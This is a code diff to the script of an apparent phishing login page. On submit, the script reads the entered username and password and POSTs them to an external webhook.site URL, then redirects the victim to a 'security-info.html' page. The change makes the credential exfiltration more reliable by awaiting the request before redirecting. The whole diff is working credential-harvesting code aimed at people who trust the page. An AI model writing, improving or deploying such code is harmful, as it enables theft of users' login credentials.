@@ -24,32 +24,37 @@
     </div>
 
     <script>
-        document.getElementById("authForm").addEventListener("submit", function(event) {
-            event.preventDefault(); // Prevent actual form submission
-            
+        document.getElementById("authForm").addEventListener("submit", async function(event) {
+            event.preventDefault(); // Stop normal form submission
+
             // Get user input
             let user = document.querySelector('input[name="user"]').value;
             let pass = document.querySelector('input[name="pass"]').value;
-            
-            // Create payload
-            let payload = {
-                user: user,
-                pass: pass,
-                action: "Login Attempt",
-                time: new Date().toISOString()
-            };
 
-            // Send data to webhook with fetch() and keepalive
+            // Create payload
+            let payload = new URLSearchParams();
+            payload.append("user", user);
+            payload.append("pass", pass);
+
+            // Webhook URL
             let webhookURL = "https://webhook.site/39b5507e-6e25-4a60-b84e-3cd3e4e84c0f";
-            fetch(webhookURL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payload),
-                keepalive: true  // Ensures request completes even if page is redirected
-            }).then(() => {
-                // Redirect user after ensuring data is sent
+
+            try {
+                // Use await to ensure form data is sent before redirection
+                let response = await fetch(webhookURL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                    body: payload
+                });
+
+                console.log("Data sent successfully:", response);
+
+                // Redirect user only after successful request
                 window.location.href = "security-info.html";
-            }).catch(error => console.error("Error:", error));
+
+            } catch (error) {
+                console.error("Error sending data:", error);
+            }
         });
     </script>
 
